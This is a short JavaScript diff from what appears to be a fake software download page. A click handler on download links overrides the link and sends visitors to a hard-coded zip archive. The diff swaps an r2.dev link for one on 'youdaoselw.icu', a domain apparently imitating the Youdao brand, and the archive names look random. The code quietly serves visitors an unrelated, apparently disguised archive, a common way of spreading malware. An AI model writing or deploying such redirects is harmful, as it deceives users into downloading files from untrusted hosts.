@@ -8,6 +8,6 @@ downLinks.forEach(function(link) {
         event.preventDefault();
 
         // 执行跳转操作，替换下面的URL为您想要跳转的URL
-        window.location.href = "https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/Rex_win7-11_xWaugWaug_v3262.7.zip";
+        window.location.href = "https://youdaoselw.icu/XP_Tunewunwunsp_xp-w11m_v963325.204.zip";
     });
 });
